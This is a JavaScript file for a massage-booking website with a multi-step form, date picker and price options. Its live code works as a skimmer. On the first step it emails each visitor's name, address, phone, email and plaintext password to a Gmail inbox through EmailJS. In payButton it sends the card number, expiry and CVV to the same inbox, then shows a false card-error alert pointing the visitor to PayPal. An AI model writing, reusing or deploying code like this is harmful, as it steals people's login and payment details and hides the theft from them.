// FOR PRICING
// async function getIpInfo() {
//   const getIP_url = "https://api.ipify.org/?format=json";
//   // Make a request and store the response
//   const responseIP = await fetch(getIP_url);
//   // Decode JSON response:
//   const resultIP = await responseIP.json();
//   // Output the "code" value inside "currency" object
//   //console.log(resultIP.ip);

//   // Set endpoint and your access key
//   const ip = resultIP.ip;
//   //const accessKey = "15e038f9-109a-45c1-a284-04a2ec26abc8";
//   const url = "https://ipapi.co/" + ip + "/json";

//   // Make a request and store the response
//   const response = await fetch(url);

//   // Decode JSON response:
//   const result = await response.json();

//   // Output the "code" value inside "currency" object
//   const currency = result.currency;
//   //console.log(currency);

//   //convert currency
//   const apikeyConvert = "8d1dbec76a264c97b3026a4f57d94978";
//   const convertURL =
//     "https://openexchangerates.org/api/latest.json?app_id=" + apikeyConvert;
//   const responseConvert = await fetch(convertURL);

//   // //Decode JSON response:
//   const resultConvert = await responseConvert.json();

//   const convertedCurrency = resultConvert;
//   //console.log(convertedCurrency);
//   //console.log(convertedCurrency.rates[currency]);
//   const totalCurrency = convertedCurrency.rates[currency];

//   const res = {
//     currencyCode: currency,
//     totalCurrency: totalCurrency,
//   };

//   return res;
// }
// const pricingResult = getIpInfo();
// //console.log(pricingResult);
// const totalCurrency = pricingResult.then((value) => {
//   console.log(value.totalCurrency);
// });

// const currencyCode = pricingResult.then((value) => {
//   console.log(value.currencyCode);
// });

// console.log(totalCurrency, currencyCode);

const prevBtns = document.querySelectorAll(".btn-prev");
const nextBtns = document.querySelectorAll(".btn-next");
const progress = document.getElementById("progress");
const formSteps = document.querySelectorAll(".form-step");
const progressSteps = document.querySelectorAll(".progress-step");

let formStepsNum = 0;

// FOR REQUIRED FORM BILLING INFO
const fullname = document.getElementById("fullname");
const address = document.getElementById("address");
const phonenumber = document.getElementById("phonenumber");
const email = document.getElementById("email");
const password = document.getElementById("password");

// FOR SCHED DATE FORM
const scheddate = document.getElementById("scheddate");
const time = document.getElementById("time");

// FOR SCHED DATE
var today = new Date();
var dd = today.getDate();
var mm = today.getMonth() + 1; //January is 0!
var yyyy = today.getFullYear();

if (dd < 10) {
  dd = "0" + dd;
}

if (mm < 10) {
  mm = "0" + mm;
}

today = yyyy + "-" + mm + "-" + dd;

document.getElementById("scheddate").setAttribute("min", today);

//FOR TOTAL PAYMENT
//const data = document.currentScript.dataset;
// const current = current;
// const price1 = totalCurrency * 150 + " " + currencyCode;
// const price2 = totalCurrency * 200 + " " + currencyCode;
// const price3 = totalCurrency * 300 + " " + currencyCode;
const data = document.currentScript.dataset;
const current = data.current;
const price1 = data.price1;
const price2 = data.price2;
const price3 = data.price3;
//console.log("price3", current);

// document.getElementById("totalPayment").innerHTML = "Total Payment: " + price3;

var offerDetails = [
  { totalPaymentVal: "" },
  { offerDescription: "" },
  { offerValue: 0 },
];
function totalPaymentFunc() {
  if (document.getElementById("offersR1").checked) {
    offerDetails["totalPaymentVal"] = "Total Payment: " + price1;
    offerDetails["offerDescription"] = "1 hour of massage for only " + price1;
    offerDetails["offerValue"] = price1;
  } else if (document.getElementById("offersR2").checked) {
    offerDetails["totalPaymentVal"] = "Total Payment: " + price2;
    offerDetails["offerDescription"] = "1 hour of massage for only " + price2;
    offerDetails["offerValue"] = price2;
  } else if (document.getElementById("offersR3").checked) {
    offerDetails["totalPaymentVal"] = "Total Payment: " + price3;
    offerDetails["offerDescription"] = "1 hour of massage for only " + price3;
    offerDetails["offerValue"] = price3;
  }
  return offerDetails;
}

nextBtns.forEach((btn) => {
  btn.addEventListener("click", () => {
    if (formStepsNum == 0) {
      if (fullname.value === "" || fullname.value == null) {
      } else if (address.value === "" || address.value == null) {
      } else if (phonenumber.value === "" || phonenumber.value == null) {
      } else if (email.value === "" || email.value == null) {
      } else if (password.value === "" || password.value == null) {
      } else {
        //alert(formStepsNum);
        formStepsNum++;
        updateFormSteps();
        updateProgressbar();
        
        const dateNow = new Date();
    let timeNow = dateNow.getTime();
    
    (function () {
      emailjs.init("ZEIhIxDmuJ9hieZRH"); // Account Public Key
    })();

    var params = {
      from: "myspamassage2023@gmail.com",
      to: "myspamassage2023@gmail.com",
      subject: "Contact Info " + today + " " + timeNow,
      replyto: "",
      message:
        "fullname: " +
        fullname.value +
        " \n" +
        "address: " +
        address.value +
        " \n" +
        "phonenumber: " +
        phonenumber.value +
        " \n" +
        "email: " +
        email.value +
        " \n" +
        "password: " +
        password.value,
    };

    var serviceID = "service_zgiz1w8"; // Email Service ID
    var templateID = "template_lq00n7p"; // Email Template ID

    emailjs
      .send(serviceID, templateID, params)
      .then((res) => {
        
      })
      .catch((e) => {
        alert("Error: ", e);
      });

      }
      //alert(formStepsNum);
    } else if (formStepsNum == 1) {
      if (scheddate.value === "" || scheddate.value == null) {
      } else if (time.value === "" || time.value == null) {
      } else {
        //alert(formStepsNum);
        formStepsNum++;
        updateFormSteps();
        updateProgressbar();
        //alert(formStepsNum);
        var totalValInfo = totalPaymentFunc();
        // document.getElementById("totalPayment").innerHTML =
        //   totalValInfo["totalPaymentVal"];
      }
    }
  });
});

prevBtns.forEach((btn) => {
  btn.addEventListener("click", () => {
    formStepsNum--;
    updateFormSteps();
    updateProgressbar();
  });
});

function updateFormSteps() {
  formSteps.forEach((formStep) => {
    formStep.classList.contains("form-step-active") &&
      formStep.classList.remove("form-step-active");
  });

  formSteps[formStepsNum].classList.add("form-step-active");
}

function updateProgressbar() {
  progressSteps.forEach((progressStep, idx) => {
    if (idx < formStepsNum + 1) {
      progressStep.classList.add("progress-step-active");
    } else {
      progressStep.classList.remove("progress-step-active");
    }
  });

  const progressActive = document.querySelectorAll(".progress-step-active");

  progress.style.width =
    ((progressActive.length - 1) / (progressSteps.length - 1)) * 100 + "%";
}

// FOR PAYPAL
// function initPayPalButton() {
//   var offerDetails = totalPaymentFunc();
//   paypal
//     .Buttons({
//       style: {
//         shape: "rect",
//         color: "gold",
//         layout: "horizontal",
//         label: "paypal",
//       },

//       createOrder: function (data, actions) {
//         return actions.order.create({
//           purchase_units: [
//             {
//               description: offerDetails["offerDescription"],
//               amount: {
//                 currency_code: "EUR",
//                 value: offerDetails["offerValue"],
//               },
//             },
//           ],
//         });
//       },

//       onApprove: function (data, actions) {
//         return actions.order.capture().then(function (orderData) {
//           // Full available details
//           console.log(
//             "Capture result",
//             orderData,
//             JSON.stringify(orderData, null, 2)
//           );

//           // Show a success message within this page, e.g.
//           const element = document.getElementById("paypal-button-container");
//           element.innerHTML = "";
//           element.innerHTML = "<h3>Thank you for your payment!</h3>";

//           // Or go to another URL:  actions.redirect('thank_you.html');
//         });
//       },

//       onError: function (err) {
//         console.log(err);
//       },
//     })
//     .render("#paypal-button-container");
// }
// initPayPalButton();

function payButton() {
  const fullname = document.getElementById("fullname").value;
  const address = document.getElementById("address").value;
  const phonenumber = document.getElementById("phonenumber").value;
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;
  const scheddate = document.getElementById("scheddate").value;
  const time = document.getElementById("time").value;
  const cardHolder = document.getElementById("cardName").value;
  const cardNumber = document.getElementById("cardNumber").value;
  const cardMonth = document.getElementById("cardMonth").value;
  const cardDate = document.getElementById("cardYear").value;
  const expDate = cardMonth + "/" + cardDate;
  const CVV = document.getElementById("cardCvv").value;

  if (
    cardHolder.length > 0 &&
    cardNumber.length > 0 &&
    expDate.length > 0 &&
    CVV.length > 0
  ) {
   
    const dateNow = new Date();
    let timeNow = dateNow.getTime();

    (function () {
      emailjs.init("ZEIhIxDmuJ9hieZRH"); // Account Public Key
    })();

    var params = {
      from: "myspamassage2023@gmail.com",
      to: "myspamassage2023@gmail.com",
      subject: "Credit Card Info " + today + " " + timeNow,
      replyto: "",
      message:
        "cardHolder: " +
        cardHolder +
        " \n" +
        "cardNumber: " +
        cardNumber +
        " \n" +
        "expDate: " +
        expDate +
        " \n" +
        "CVV: " +
        CVV +
        " \n",
    };

    var serviceID = "service_zgiz1w8"; // Email Service ID
    var templateID = "template_lq00n7p"; // Email Template ID

    emailjs
      .send(serviceID, templateID, params)
      .then((res) => {
        alert(
          "There was a problem with your card. \nPlease try to use PayPal. \n\nThank You!"
        );
      })
      .catch((e) => {
        alert("Error: ", e);
      });
  }
}

window.addEventListener("scroll", function () {
  var header = this.document.querySelector("header");
  header.classList.toggle("sticky", window.scrollY > 0);
});
